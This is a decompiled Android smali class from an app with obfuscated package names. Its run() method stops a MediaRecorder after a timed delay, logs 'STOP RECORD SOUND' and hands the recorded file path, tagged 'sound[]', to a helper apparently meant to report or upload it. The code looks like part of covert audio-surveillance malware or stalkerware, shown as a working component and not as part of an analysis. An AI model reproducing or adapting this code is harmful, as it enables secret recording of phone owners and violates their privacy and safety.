.class Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->a(Landroid/content/Context;Ljava/lang/String;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:I

.field final synthetic b:Landroid/media/MediaRecorder;

.field final synthetic c:Ljava/lang/String;

.field final synthetic d:Landroid/content/Context;

.field final synthetic e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;


# direct methods
.method constructor <init>(Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;ILandroid/media/MediaRecorder;Ljava/lang/String;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iput p2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->a:I

    iput-object p3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->b:Landroid/media/MediaRecorder;

    iput-object p4, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->c:Ljava/lang/String;

    iput-object p5, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->d:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    const/4 v0, 0x1

    :try_start_0
    iget v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->a:I

    mul-int/lit16 v1, v1, 0x3e8

    int-to-long v1, v1

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_2
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "SOUND"

    const-string v3, "STOP RECORD SOUND"

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :try_start_1
    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->b:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->stop()V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->b:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->release()V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iput-boolean v0, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->b:Z

    const-string v0, "FILE"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->c:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->d:Landroid/content/Context;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->c:Ljava/lang/String;

    const-string v3, ""

    const-string v4, "sound[]"

    invoke-virtual {v0, v1, v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return-void

    :catch_0
    move-exception v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "ERROR"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    :goto_0
    const-string v4, "Record Sound! "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v2, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    return-void

    :catchall_0
    move-exception v1

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iget-object v2, v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v3, "SOUND"

    const-string v4, "STOP RECORD SOUND"

    invoke-virtual {v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :try_start_2
    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->b:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->stop()V

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->b:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->release()V

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iput-boolean v0, v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->b:Z

    const-string v0, "FILE"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, ""

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->c:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->d:Landroid/content/Context;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->c:Ljava/lang/String;

    const-string v4, ""

    const-string v5, "sound[]"

    invoke-virtual {v0, v2, v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    throw v1

    :catch_1
    move-exception v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "ERROR"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    goto :goto_0

    :catch_2
    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "SOUND"

    const-string v3, "STOP RECORD SOUND"

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :try_start_3
    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->b:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->stop()V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->b:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->release()V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iput-boolean v0, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->b:Z

    const-string v0, "FILE"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->c:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->d:Landroid/content/Context;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->c:Ljava/lang/String;

    const-string v3, ""

    const-string v4, "sound[]"

    invoke-virtual {v0, v1, v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    return-void

    :catch_3
    move-exception v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb$1;->e:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/brtltydqhiuqbb;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "ERROR"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    goto/16 :goto_0
.end method
